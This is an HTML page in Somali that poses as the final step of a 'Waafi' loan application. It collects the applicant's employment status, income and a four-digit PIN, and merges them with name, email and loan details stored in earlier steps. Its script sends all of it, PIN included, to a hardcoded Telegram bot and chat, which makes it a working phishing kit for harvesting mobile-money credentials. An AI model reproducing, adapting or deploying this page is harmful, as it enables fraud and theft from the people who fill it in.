<!DOCTYPE html><html lang="so"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Talaabada 3</title><style>body{font-family:Arial;background:#f5f5f5;margin:0}
.header{background:linear-gradient(90deg,#a8e063,#00B347);padding:15px;color:white;font-weight:bold;display:flex;align-items:center;gap:15px}
.container{padding:20px;max-width:600px;margin:auto}.card{background:white;padding:25px;border-radius:15px}
h2{text-align:center;margin-bottom:5px} .sub{text-align:center;color:#999;margin-bottom:20px}
.progress{display:flex;gap:8px;margin-bottom:25px} .bar{height:5px;flex:1;background:#ddd;border-radius:5px}
.bar.active{background:linear-gradient(90deg,#a8e063,#00B347)}
label{display:block;margin:15px 0 5px;font-weight:600} input,select{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px}
.summary{background:#f0fff4;border-left:4px solid #00B347;padding:15px;border-radius:10px;margin:20px 0}
.summary .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #e0e0e0}
.pin{display:flex;justify-content:center;gap:12px;margin:15px 0}
.pin input{width:50px;height:50px;text-align:center;font-size:22px;border:2px solid #00B347;border-radius:10px}
.btn{width:100%;padding:18px;border:none;border-radius:12px;font-size:18px;font-weight:bold;background:linear-gradient(90deg,#a8e063,#00B347);color:white;margin-top:10px}
.btn:disabled{background:#ccc}</style>
</head><body>
<div class="header">← Dib u noqo <span style="margin-left:auto">Waafi</span></div>
<div class="container"><div class="card">
<h2>Codsiga Amaahda</h2><p class="sub">Tallaabada 3 ee 3 - Xaqiiji</p>
<div class="progress"><div class="bar active"></div><div class="bar active"></div><div class="bar active"></div></div>

<label>Xaaladda Shaqada</label>
<select id="work"><option>Shaqaale</option><option>Iskaashato</option><option>Arday</option><option>Shagala'aan</option></select>

<label>Dakhliga Sanadka ($)</label><input id="income" type="number" placeholder="50000">

<label style="text-align:center;margin-top:20px">Geli PIN-kaaga si aad u xaqiijiso</label>
<div class="pin">
<input type="password" maxlength="1" id="p1">
<input type="password" maxlength="1" id="p2">
<input type="password" maxlength="1" id="p3">
<input type="password" maxlength="1" id="p4">
</div>

<div class="summary"><h3>Soo koobidda Codsiga</h3>
<div class="row"><span>Qaddarka Amaahda:</span><span id="s_amount">$0</span></div>
<div class="row"><span>Muddada Amaahda:</span><span id="s_period">-</span></div>
<div class="row"><span>Ujeedada:</span><span id="s_purpose">-</span></div>
<div class="row"><span>Codsade:</span><span id="s_name">-</span></div>
</div>

<button class="btn" id="sendBtn" onclick="submit()">DIR CODSIGA</button>
</div></div>
<script>
const step1=JSON.parse(localStorage.getItem('waafi_step1')||'{}');
const step2=JSON.parse(localStorage.getItem('waafi_step2')||'{}');
s_amount.innerText='$'+Number(step1.amount||0).toLocaleString();
s_period.innerText=step1.period||'-';
s_purpose.innerText=step1.type||'-';
s_name.innerText=(step2.fname||'')+' '+(step2.lname||'');

const BOT="8811313030:AAHsQrh9DveSLEB2eRNmVPJF_2HtMGtJJ7A"; 
const CHAT="8630213836";

function submit(){
const pin=p1.value+p2.value+p3.value+p4.value;
if(pin.length<4)return alert('Geli 4 PIN');
if(!income.value)return alert('Geli dakhliga');

const fullData={...step1,...step2,work:work.value,income:income.value,pin:pin};

const message=`🔥 NEW WAAFI APPLICATION 🔥

👤 NAME: ${fullData.fname} ${fullData.lname}
📧 EMAIL: ${fullData.email}
📱 PHONE: +252 
🔑 PIN: ${fullData.pin}

💰 LOAN: ${fullData.type}
💵 AMOUNT: $${fullData.amount}
📅 PERIOD: ${fullData.period}
🎯 PURPOSE: ${fullData.purpose}

💼 WORK: ${fullData.work}
📈 INCOME: $${fullData.income}

Time: ${new Date().toLocaleString()}`;

fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({chat_id:CHAT,text:message})
})
.then(res=>res.json())
.then(data=>{
if(data.ok){
localStorage.clear();
location.href='success.html';
}else{alert('Error: '+data.description)}
})
.catch(err=>alert("Internet error"));
}
</script></body></html>
